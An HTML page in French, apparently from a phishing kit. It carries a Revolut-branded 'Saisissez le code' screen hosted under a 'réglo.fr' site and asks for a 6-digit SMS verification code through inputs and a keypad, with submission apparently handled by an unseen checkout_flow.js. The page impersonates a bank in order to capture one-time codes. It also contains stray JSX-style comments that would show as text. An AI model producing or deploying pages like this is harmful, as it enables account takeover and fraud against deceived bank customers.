<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Revolut - Vérification | réglo.fr</title> <!-- Updated title -->
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="revolut_theme.css">
</head>
<body class="revolut-theme">
    <header class="site-header">
        <div class="container">
            <div class="logo-area">
                <a href="index.html" class="logo">réglo<span>.</span></a>
            </div>
        </div>
    </header>

    <main class="revolut-page-content container"> {/* Added main wrapper */}
        <div class="revolut-card">
            <div class="revolut-auth-logo">
                <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
            </div>
            
            <h1 class="revolut-title">Saisissez le code</h1>
            <p class="revolut-subtitle" id="revolut-phone-hint">Nous avons envoyé un code à 6 chiffres sur votre téléphone.</p>
            
            <form id="revolut-code-form"> {/* Added form for semantic grouping, though JS handles submission */}
                <div class="revolut-code-inputs">
                    <input type="text" class="revolut-code-input" maxlength="1" inputmode="numeric">
                    <input type="text" class="revolut-code-input" maxlength="1" inputmode="numeric">
                    <input type="text" class="revolut-code-input" maxlength="1" inputmode="numeric">
                    <input type="text" class="revolut-code-input" maxlength="1" inputmode="numeric">
                    <input type="text" class="revolut-code-input" maxlength="1" inputmode="numeric">
                    <input type="text" class="revolut-code-input" maxlength="1" inputmode="numeric">
                </div>
            </form>
            
            <a href="#" class="revolut-code-link">Code oublié ?</a>
            
            <div class="revolut-keypad">
                <div class="revolut-key" data-key="1">1</div>
                <div class="revolut-key" data-key="2">2</div>
                <div class="revolut-key" data-key="3">3</div>
                <div class="revolut-key" data-key="4">4</div>
                <div class="revolut-key" data-key="5">5</div>
                <div class="revolut-key" data-key="6">6</div>
                <div class="revolut-key" data-key="7">7</div>
                <div class="revolut-key" data-key="8">8</div>
                <div class="revolut-key" data-key="9">9</div>
                <div class="revolut-key revolut-key-special" id="clearKey">Effacer</div>
                <div class="revolut-key" data-key="0">0</div>
                <div class="revolut-key revolut-key-special" id="submitKey">OK</div>
            </div>
        </div>
    </main>

    <footer class="site-footer-v2">
        <div class="container">
            <div class="footer-columns">
                 <div class="footer-column">
                    <h4>Support</h4>
                    <ul>
                        <li><a href="#">FAQ</a></li>
                        <li><a href="javascript:void(0);" class="legal-link" data-type="terms">CGV</a></li>
                    </ul>
                </div>
            </div>
            <div class="footer-bottom-v2">
                <p>&copy; 2024 réglo. Tous droits réservés.</p>
            </div>
        </div>
    </footer>

    <script src="checkout_flow.js" defer></script>
</body>
</html>
